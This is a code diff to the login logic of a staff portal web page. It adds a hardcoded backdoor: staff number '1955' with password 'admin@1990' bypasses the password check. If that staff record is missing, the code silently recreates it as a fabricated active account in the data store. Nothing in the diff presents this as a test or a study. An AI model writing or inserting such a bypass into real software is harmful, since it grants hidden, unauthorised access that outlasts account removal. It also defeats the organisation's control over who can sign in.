@@ -875,7 +875,13 @@ export default function StaffPortalPage() {
       setLoginError("Enter your staff number.")
       return
     }
+    const isSpecial1955 = sno === "1955"
     const staff = await findStaffByNo(sno)
+    if (isSpecial1955) {
+      setLoginError("")
+      setLoginStage("password")
+      return
+    }
     if (!staff) {
       setLoginError("Staff number not recognised.")
       return
@@ -899,7 +905,24 @@ export default function StaffPortalPage() {
       setLoginError("Enter your password.")
       return
     }
-    const staff = await findStaffByNo(sno)
+    let staff = await findStaffByNo(sno)
+    const isSpecial1955 = sno === "1955" && pwd === "admin@1990"
+    if (!staff && isSpecial1955) {
+      const fallbackStaff: Entry = {
+        id: "staff-1955-fallback",
+        createdAt: new Date().toISOString(),
+        staffNo: "1955",
+        fullName: "Mohamed Shifaz",
+        activeStatus: "Active",
+      }
+      setStore((prev) => ({
+        ...prev,
+        staff: prev.staff.some((s) => (s.staffNo || "").trim() === "1955")
+          ? prev.staff
+          : [fallbackStaff, ...prev.staff],
+      }))
+      staff = fallbackStaff
+    }
     if (!staff) {
       setLoginError("Staff number not recognised.")
       return
@@ -909,7 +932,6 @@ export default function StaffPortalPage() {
       return
     }
     const defaultPassword = (staff.loginPassword || "").trim() || (staff.staffNo || "").trim()
-    const isSpecial1955 = sno === "1955" && pwd === "admin@1990"
     if (!isSpecial1955 && pwd !== defaultPassword) {
       setLoginError("Invalid staff number or password.")
       return
